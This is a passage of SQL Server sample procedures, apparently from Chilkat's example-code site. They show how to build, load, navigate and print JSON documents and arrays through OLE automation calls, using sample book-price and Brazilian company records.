    EXEC sp_OAMethod @detail, 'AddNumberAt', @success OUT, -1, 'ISBN-13', '9781408704004'
    EXEC sp_OAMethod @detail, 'AddStringAt', @success OUT, -1, 'Language', 'English'
    EXEC sp_OAMethod @detail, 'AddIntAt', @success OUT, -1, 'Pages', 494
    EXEC @hr = sp_OADestroy @detail


/*
	  Add the array for Price
*/
     
    EXEC sp_OAMethod @json, 'AddArrayAt', @success OUT, -1, 'Price'
    DECLARE @aPrice int
    EXEC sp_OAGetProperty @json, 'Size', @iTmp0 OUT
    EXEC sp_OAMethod @json, 'ArrayAt', @aPrice OUT, @iTmp0 - 1


/*
	  Entry entry in aPrice will be a JSON object.
      Append a new/empty ojbect to the end of the aPrice array.
*/


    EXEC sp_OAMethod @aPrice, 'AddObjectAt', @success OUT, -1
    --  Get the object that was just appended.
    DECLARE @priceObj int
    EXEC sp_OAGetProperty @aPrice, 'Size', @iTmp0 OUT
    EXEC sp_OAMethod @aPrice, 'ObjectAt', @priceObj OUT, @iTmp0 - 1
    EXEC sp_OAMethod @priceObj, 'AddStringAt', @success OUT, -1, 'type', 'Hardcover'
    EXEC sp_OAMethod @priceObj, 'AddNumberAt', @success OUT, -1, 'price', '16.65'
    EXEC @hr = sp_OADestroy @priceObj

    EXEC sp_OAMethod @aPrice, 'AddObjectAt', @success OUT, -1
    EXEC sp_OAGetProperty @aPrice, 'Size', @iTmp0 OUT
    EXEC sp_OAMethod @aPrice, 'ObjectAt', @priceObj OUT, @iTmp0 - 1
    EXEC sp_OAMethod @priceObj, 'AddStringAt', @success OUT, -1, 'type', 'Kindle Edition'
    EXEC sp_OAMethod @priceObj, 'AddNumberAt', @success OUT, -1, 'price', '7.00'
    EXEC @hr = sp_OADestroy @priceObj

    EXEC @hr = sp_OADestroy @aPrice

    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO

https://www.example-code.com/sql/json_get_document_root.asp

--Get the Root of a JSON Document
--Demonstrates how to get back to the JSON root object from anywhere in the JSON document. 
--This example uses the following JSON document:

{
	"flower": "tulip",
		"abc":
	    {
	    "x": [
	       { "a" : 1 },
	       { "b1" : 100, "b2" : 200 },
	       { "c" : 3 }
	    ],
	    "y": 200,
	    "z": 200
	    }
}
	
CREATE PROCEDURE ChilkatSample
	AS
	BEGIN
	    DECLARE @hr int
	    DECLARE @iTmp0 int
	    DECLARE @sTmp0 nvarchar(4000)
	    DECLARE @json int
	    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
	    IF @hr <> 0
	    BEGIN
	        PRINT 'Failed to create ActiveX component'
	        RETURN
	    END
	
	    DECLARE @jsonStr nvarchar(4000)
	    SELECT @jsonStr = '{"flower": "tulip","abc":{"x": [{ "a" : 1 },{ "b1" : 100, "b2" : 200 },{ "c" : 3 }],"y": 200,"z": 200}}'
	
	    DECLARE @success int
	    EXEC sp_OAMethod @json, 'Load', @success OUT, @jsonStr
	    IF @success <> 1
	      BEGIN
	        EXEC sp_OAGetProperty @json, 'LastErrorText', @sTmp0 OUT
	        PRINT @sTmp0
	        EXEC @hr = sp_OADestroy @json
	        RETURN
	      END
	
	    -- Get the "abc" object.
	    DECLARE @abcObj int
	    EXEC sp_OAMethod @json, 'ObjectOf', @abcObj OUT, 'abc'
	    EXEC sp_OAGetProperty @json, 'LastMethodSuccess', @iTmp0 OUT
	    IF @iTmp0 = 0
	      BEGIN
	
	        PRINT 'abc object not found.'
	        EXEC @hr = sp_OADestroy @json
	        RETURN
	      END
	
	    -- Side note: The JSON of a sub-part of the document can be emitted from any JSON object:
	    EXEC sp_OASetProperty @abcObj, 'EmitCompact', 0
	    EXEC sp_OAMethod @abcObj, 'Emit', @sTmp0 OUT
	    PRINT @sTmp0
	
	    -- Navigate to the "x" array
	    DECLARE @xArray int
	    EXEC sp_OAMethod @abcObj, 'ArrayOf', @xArray OUT, 'x'
	    -- We'll skip the null check and assume it's non-null...
	
	    -- Navigate to the 2nd object contained within the array.  This contains members b1 and b2
	    DECLARE @bObj int
	    EXEC sp_OAMethod @xArray, 'ObjectAt', @bObj OUT, 1
	    -- We'll skip the null check and assume it's non-null...
	
	    -- Show that we're at "b1/b2".
	    -- The value of "b1" should be "200"
	
	    EXEC sp_OAMethod @bObj, 'IntOf', @iTmp0 OUT, 'b2'
	    PRINT 'b2 = ' + @iTmp0
	
	    -- Now go back to the JSON doc root:
	    DECLARE @docRoot int
	    EXEC sp_OAMethod @bObj, 'GetDocRoot', @docRoot OUT
	    -- We'll skip the null check and assume it's non-null...
	
	    -- Pretty-print the JSON doc from the root to show that this is indeed the root.
	    EXEC sp_OASetProperty @docRoot, 'EmitCompact', 0
	    EXEC sp_OAMethod @docRoot, 'Emit', @sTmp0 OUT
	    PRINT @sTmp0
	
	    EXEC @hr = sp_OADestroy @docRoot
	
	    EXEC @hr = sp_OADestroy @bObj
	
	    EXEC @hr = sp_OADestroy @xArray
	
	    EXEC @hr = sp_OADestroy @abcObj
	
	
	    EXEC @hr = sp_OADestroy @json
	
	
	END
	GO


https://www.example-code.com/sql/json_array_load_and_parse.asp

(SQL Server) Loading and Parsing a JSON Array
A JSON array is JSON that begins with "[" and ends with "]". For example, this is a JSON array that contains 3 JSON objects.

[{"name":"jack"},{"name":"john"},{"name":"joe"}]
A JSON object, however, is JSON that begins with "{" and ends with "}". For example, this JSON is an object that contains an array.
{"pets":[{"name":"jack"},{"name":"john"},{"name":"joe"}]}
This example shows how loading a JSON array is different than loading a JSON object.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @strJsonArray nvarchar(4000)
    SELECT @strJsonArray = '[{"name":"jack"},{"name":"john"},{"name":"joe"}]'

    DECLARE @strJsonObject nvarchar(4000)
    SELECT @strJsonObject = '{"pets":[{"name":"jack"},{"name":"john"},{"name":"joe"}]}'

    --  A JSON array must be loaded using JsonArray:
    DECLARE @jsonArray int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonArray', @jsonArray OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @jsonArray, 'Load', @success OUT, @strJsonArray

    --  Examine the values:
    DECLARE @i int
    SELECT @i = 0
    EXEC sp_OAGetProperty @jsonArray, 'Size', @iTmp0 OUT
    WHILE @i < @iTmp0
      BEGIN
        DECLARE @jsonObj int
        EXEC sp_OAMethod @jsonArray, 'ObjectAt', @jsonObj OUT, @i

        EXEC sp_OAMethod @jsonObj, 'StringOf', @sTmp0 OUT, 'name'
        PRINT @i + ': ' + @sTmp0
        EXEC @hr = sp_OADestroy @jsonObj

        SELECT @i = @i + 1
      END

    --  Output is:

    --  	0: jack
    --  	1: john
    --  	2: joe

    --  A JSON object must be loaded using JsonObject
    DECLARE @jsonObject int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @jsonObject OUT

    EXEC sp_OAMethod @jsonObject, 'Load', @success OUT, @strJsonObject

    --  Examine the values:
    SELECT @i = 0
    DECLARE @numPets int
    EXEC sp_OAMethod @jsonObject, 'SizeOfArray', @numPets OUT, 'pets'
    WHILE @i < @numPets
      BEGIN
        EXEC sp_OASetProperty @jsonObject, 'I', @i

        EXEC sp_OAMethod @jsonObject, 'StringOf', @sTmp0 OUT, 'pets[i].name'
        PRINT @i + ': ' + @sTmp0
        SELECT @i = @i + 1
      END

    --  Output is:

    --  	0: jack
    --  	1: john
    --  	2: joe

    EXEC @hr = sp_OADestroy @jsonArray
    EXEC @hr = sp_OADestroy @jsonObject


END
GO


https://www.example-code.com/sql/json_load_complex_array.asp


(SQL Server) Loading and Parsing a Complex JSON Array
This example loads a JSON array containing more complex data. It shows how to parse (access) various values contained within the JSON.



CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    --  This is the JSON we'll be loading:

    --  	[
    --  	  {
    --  	    "telefones": [
    --  	      {
    --  	        "numero": "19995555555",
    --  	        "tipo": "T",
    --  	        "id": 2541437
    --  	      }
    --  	    ],
    --  	    "cnpj": "11395551000164",
    --  	    "rua": "R XAVIER AUGUSTO ROGGE, 22",
    --  	    "complemento": "",
    --  	    "contatos": [
    --  	    ],
    --  	    "tipo": "J",
    --  	    "razao_social": "SOUP BRASIL LTDA - ME",
    --  	    "nome_fantasia": "SOUP BRASIL",
    --  	    "bairro": "ABC DOS COLIBRIS",
    --  	    "cidade": "TEST",
    --  	    "inscricao_estadual": "222.102.222.116",
    --  	    "observacao": "",
    --  	    "id": 2209595,
    --  	    "ultima_alteracao": "2016-12-26 16:22:34",
    --  	    "cep": "13555000",
    --  	    "suframa": "",
    --  	    "estado": "SP",
    --  	    "emails": [
    --  	      {
    --  	        "email": "somebody@terra.com.br",
    --  	        "tipo": "T",
    --  	        "id": 1065557
    --  	      }
    --  	    ],
    --  	    "excluido": false
    --  	  },
    --  	  {
    --  	    "telefones": [
    --  	    ],
    --  	    "cnpj": "12496555500180",
    --  	    "rua": "AV ROLF WIEST, 100",
    --  	    "complemento": "ANDAR 7 SALA 612 A 620",
    --  	    "contatos": [
    --  	    ],
    --  	    "tipo": "J",
    --  	    "razao_social": "SIMPLE SOFTWARE LTDA",
    --  	    "nome_fantasia": "",
    --  	    "bairro": "DOM ZETIRO",
    --  	    "cidade": "APARTVILLE",
    --  	    "inscricao_estadual": "",
    --  	    "observacao": "",
    --  	    "id": 2255594,
    --  	    "ultima_alteracao": "2016-12-26 16:28:31",
    --  	    "cep": "89255505",
    --  	    "suframa": "",
    --  	    "estado": "SC",
    --  	    "emails": [
    --  	    ],
    --  	    "excluido": false
    --  	  },
    --  	  {
    --  	    "telefones": [
    --  	      {
    --  	        "numero": "1938655556",
    --  	        "tipo": "T",
    --  	        "id": 2555438
    --  	      }
    --  	    ],
    --  	    "cnpj": "00003555500153",
    --  	    "rua": "AV ABCDEF PINTO CATAO, 18",
    --  	    "complemento": "",
    --  	    "contatos": [
    --  	      {
    --  	        "telefones": [
    --  	          {
    --  	            "numero": "1999655554",
    --  	            "tipo": "T",
    --  	            "id": 2555559
    --  	          }
    --  	        ],
    --  	        "cargo": "zzz de compras",
    --  	        "nome": "Gerard",
    --  	        "emails": [
    --  	          {
    --  	            "email": "gerard@terra.com.br",
    --  	            "tipo": "T",
    --  	            "id": 1065559
    --  	          }
    --  	        ],
    --  	        "id": 844485,
    --  	        "excluido": false
    --  	      }
    --  	    ],
    --  	    "tipo": "J",
    --  	    "razao_social": "TIDY TECNOLOGIA LTDA - EPP",
    --  	    "nome_fantasia": "TIDY",
    --  	    "bairro": "TUNA",
    --  	    "cidade": "JAGUAR",
    --  	    "inscricao_estadual": "395.222.441.222",
    --  	    "observacao": "ligar sempre depois das 14hs",
    --  	    "id": 2255597,
    --  	    "ultima_alteracao": "2016-12-28 07:31:52",
    --  	    "cep": "13555500",
    --  	    "suframa": "",
    --  	    "estado": "SP",
    --  	    "emails": [
    --  	      {
    --  	        "email": "xi@tidy.com.br",
    --  	        "tipo": "T",
    --  	        "id": 10655558
    --  	      }
    --  	    ],
    --  	    "excluido": false
    --  	  }
    --  	]
    -- 

    --  Construct a StringBuilder containing the above JSON array.
    DECLARE @sb int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.StringBuilder', @sb OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @bCrlf int
    SELECT @bCrlf = 1
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '[', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '  {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "telefones": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "numero": "19995555555",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "tipo": "T",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "id": 2541437', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      }', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "cnpj": "11395551000164",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "rua": "R XAVIER AUGUSTO ROGGE, 22",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "complemento": "",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "contatos": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "tipo": "J",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "razao_social": "SOUP BRASIL LTDA - ME",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "nome_fantasia": "SOUP BRASIL",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "bairro": "ABC DOS COLIBRIS",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "cidade": "TEST",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "inscricao_estadual": "222.102.222.116",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "observacao": "",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "id": 2209595,', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "ultima_alteracao": "2016-12-26 16:22:34",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "cep": "13555000",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "suframa": "",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "estado": "SP",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "emails": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "email": "somebody@terra.com.br",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "tipo": "T",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "id": 1065557', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      }', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "excluido": false', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '  },', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '  {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "telefones": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "cnpj": "12496555500180",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "rua": "AV ROLF WIEST, 100",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "complemento": "ANDAR 7 SALA 612 A 620",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "contatos": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "tipo": "J",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "razao_social": "SIMPLE SOFTWARE LTDA",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "nome_fantasia": "",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "bairro": "DOM ZETIRO",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "cidade": "APARTVILLE",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "inscricao_estadual": "",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "observacao": "",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "id": 2255594,', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "ultima_alteracao": "2016-12-26 16:28:31",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "cep": "89255505",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "suframa": "",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "estado": "SC",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "emails": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "excluido": false', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '  },', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '  {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "telefones": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "numero": "1938655556",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "tipo": "T",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "id": 2555438', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      }', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "cnpj": "00003555500153",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "rua": "AV ABCDEF PINTO CATAO, 18",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "complemento": "",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "contatos": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "telefones": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '          {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '            "numero": "1999655554",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '            "tipo": "T",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '            "id": 2555559', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '          }', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "cargo": "zzz de compras",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "nome": "Gerard",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "emails": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '          {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '            "email": "gerard@terra.com.br",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '            "tipo": "T",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '            "id": 1065559', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '          }', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "id": 844485,', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "excluido": false', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      }', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "tipo": "J",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "razao_social": "TIDY TECNOLOGIA LTDA - EPP",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "nome_fantasia": "TIDY",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "bairro": "TUNA",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "cidade": "JAGUAR",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "inscricao_estadual": "395.222.441.222",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "observacao": "ligar sempre depois das 14hs",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "id": 2255597,', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "ultima_alteracao": "2016-12-28 07:31:52",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "cep": "13555500",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "suframa": "",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "estado": "SP",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "emails": [', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      {', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "email": "xi@tidy.com.br",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "tipo": "T",', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '        "id": 10655558', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '      }', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    ],', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '    "excluido": false', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, '  }', @bCrlf
    EXEC sp_OAMethod @sb, 'AppendLine', @success OUT, ']', @bCrlf

    --  Load the JSON array into a JsonArray:
    DECLARE @jsonArray int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonArray', @jsonArray OUT

    DECLARE @success int
    EXEC sp_OAMethod @jsonArray, 'LoadSb', @success OUT, @sb
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @jsonArray, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @sb
        EXEC @hr = sp_OADestroy @jsonArray
        RETURN
      END

    --  Get some information from each record in the array.
    DECLARE @numRecords int
    EXEC sp_OAGetProperty @jsonArray, 'Size', @numRecords OUT
    DECLARE @i int
    SELECT @i = 0
    WHILE @i < @numRecords
      BEGIN


        PRINT '------ Record ' + @i + ' -------'

        DECLARE @jsonRecord int
        EXEC sp_OAMethod @jsonArray, 'ObjectAt', @jsonRecord OUT, @i

        --  Examine information for this record
        DECLARE @numTelefones int
        EXEC sp_OAMethod @jsonRecord, 'SizeOfArray', @numTelefones OUT, 'telefones'

        PRINT 'Number of telefones: ' + @numTelefones
        DECLARE @j int
        SELECT @j = 0
        WHILE @j < @numTelefones
          BEGIN
            EXEC sp_OASetProperty @jsonRecord, 'J', @j

            EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'telefones[j].numero'
            PRINT '  telefones numero: ' + @sTmp0

            EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'telefones[j].tipo'
            PRINT '  telefones tipo: ' + @sTmp0

            EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'telefones[j].id'
            PRINT '  telefones id: ' + @sTmp0
            SELECT @j = @j + 1
          END


        EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'cnpj'
        PRINT 'cnpj: ' + @sTmp0

        EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'rua'
        PRINT 'rua: ' + @sTmp0
        --  ...

        DECLARE @numContatos int
        EXEC sp_OAMethod @jsonRecord, 'SizeOfArray', @numContatos OUT, 'contatos'

        PRINT 'Number of contatos: ' + @numContatos
        SELECT @j = 0
        WHILE @j < @numContatos
          BEGIN
            EXEC sp_OASetProperty @jsonRecord, 'J', @j

            EXEC sp_OAMethod @jsonRecord, 'SizeOfArray', @numTelefones OUT, 'contatos[j].telefones'

            PRINT '  Number of telefones: ' + @numTelefones
            DECLARE @k int
            SELECT @k = 0
            WHILE @k < @numTelefones
              BEGIN
                EXEC sp_OASetProperty @jsonRecord, 'K', @k

                EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'contatos[j].telefones[k].numero'
                PRINT '  telefones numero: ' + @sTmp0

                EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'contatos[j].telefones[k].tipo'
                PRINT '  telefones tipo: ' + @sTmp0

                EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'contatos[j].telefones[k].id'
                PRINT '  telefones id: ' + @sTmp0
                SELECT @k = @k + 1
              END


            EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'contatos[j].cargo'
            PRINT '  cargo: ' + @sTmp0

            DECLARE @numEmails int
            EXEC sp_OAMethod @jsonRecord, 'SizeOfArray', @numEmails OUT, 'contatos[j].emails'

            PRINT '  Number of emails: ' + @numEmails
            SELECT @k = 0
            WHILE @k < @numEmails
              BEGIN
                EXEC sp_OASetProperty @jsonRecord, 'K', @k

                EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'contatos[j].emails[k].email'
                PRINT '  emails email: ' + @sTmp0

                EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'contatos[j].emails[k].tipo'
                PRINT '  emails tipo: ' + @sTmp0

                EXEC sp_OAMethod @jsonRecord, 'StringOf', @sTmp0 OUT, 'contatos[j].emails[k].id'
                PRINT '  emails id: ' + @sTmp0
                SELECT @k = @k + 1
              END

            SELECT @j = @j + 1
          END

        EXEC @hr = sp_OADestroy @jsonRecord

        SELECT @i = @i + 1
      END

    --  The output for the above code is:

    --  	------ Record 0 -------
    --  	Number of telefones: 1
    --  	  telefones numero: 19995555555
    --  	  telefones tipo: T
    --  	  telefones id: 2541437
    --  	cnpj: 11395551000164
    --  	rua: R XAVIER AUGUSTO ROGGE, 22
    --  	Number of contatos: 0
    --  	------ Record 1 -------
    --  	Number of telefones: 0
    --  	cnpj: 12496555500180
    --  	rua: AV ROLF WIEST, 100
    --  	Number of contatos: 0
    --  	------ Record 2 -------
    --  	Number of telefones: 1
    --  	  telefones numero: 1938655556
    --  	  telefones tipo: T
    --  	  telefones id: 2555438
    --  	cnpj: 00003555500153
    --  	rua: AV ABCDEF PINTO CATAO, 18
    --  	Number of contatos: 1
    --  	  Number of telefones: 1
    --  	  telefones numero: 1999655554
    --  	  telefones tipo: T
    --  	  telefones id: 2555559
    --  	  cargo: zzz de compras
    --  	  Number of emails: 1
    --  	  emails email: gerard@terra.com.br
    --  	  emails tipo: T
    --  	  emails id: 1065559
    -- 

    EXEC @hr = sp_OADestroy @sb
    EXEC @hr = sp_OADestroy @jsonArray


END
GO

https://www.example-code.com/sql/json_append_string_array.asp


(SQL Server) JSON Append String Array
Demonstrates how to append an array of strings from a string table object.

Note: This example uses the AppendStringTable method, which was introduced in Chilkat v9.5.0.67


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @json, 'EmitCompact', 0

    EXEC sp_OAMethod @json, 'AppendString', @success OUT, 'abc', '123'

    DECLARE @st int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.StringTable', @st OUT

    EXEC sp_OAMethod @st, 'Append', @success OUT, 'a'
    EXEC sp_OAMethod @st, 'Append', @success OUT, 'b'
    EXEC sp_OAMethod @st, 'Append', @success OUT, 'c'
    EXEC sp_OAMethod @st, 'Append', @success OUT, 'd'

    EXEC sp_OAMethod @json, 'AppendStringArray', @success OUT, 'strArray', @st

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  Output:

    --  	{
    --  	  "abc": "123",
    --  	  "strArray": [
    --  	    "a",
    --  	    "b",
    --  	    "c",
    --  	    "d"
    --  	  ]
    --  	}

    EXEC @hr = sp_OADestroy @json
    EXEC @hr = sp_OADestroy @st


END
GO



https://www.example-code.com/sql/json_predefine.asp



(SQL Server) Using Pre-defined JSON Templates
Demonstrates how to predefine a JSON template, and then use it to emit JSON with variable substitutions.

Note: This example requires Chilkat v9.5.0.67 or greater.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
